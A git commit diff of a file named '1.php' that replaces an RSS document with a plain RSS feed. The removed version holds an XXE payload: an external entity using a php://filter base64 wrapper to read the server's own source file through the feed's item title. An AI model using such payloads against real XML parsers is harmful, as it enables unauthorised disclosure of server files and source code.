3f58064ce39fc81688e2679e26ddb8b72d8a04fc
Antoshkis <113177075+Antoshkis@users.noreply.github.com>
2024-12-11 04:45:08 -0500

    Update 1.php

--- 1.php
+++ 1.php
@@ -1,20 +1,20 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE rss [
-  <!ELEMENT title ANY>
-  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=1.php" >
-]>
-<rss version="1.0" xmlns:atom=" http://www.w3.org/2005/Atom ">
-  <channel>
-    <title>The Blog</title>
-    <link> http://example.com/ </link>
-    <description>A blog about things</description>
-    <lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
-    <item>
-      <title>&xxe;</title>
-      <link> http://example.com </link>
-      <description>a post</description>
-      <author> author@example.com </author>
-      <pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
-    </item>
-  </channel>
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+
+<channel>
+  <title>Baduf Git</title>
+  <link>https://github.com/wegif123</link>
+  <description>ABOBABABABABAB</description>
+  <item>
+    <title>RSS Tutorial</title>
+    <link>https://github.com/wegif123</link>
+    <description>New RSS tutorial</description>
+  </item>
+  <item>
+    <title>XML Tutorial</title>
+    <link>https://github.com/wegif123</link>
+    <description>New XML tutorial</description>
+  </item>
+</channel>
+
 </rss>
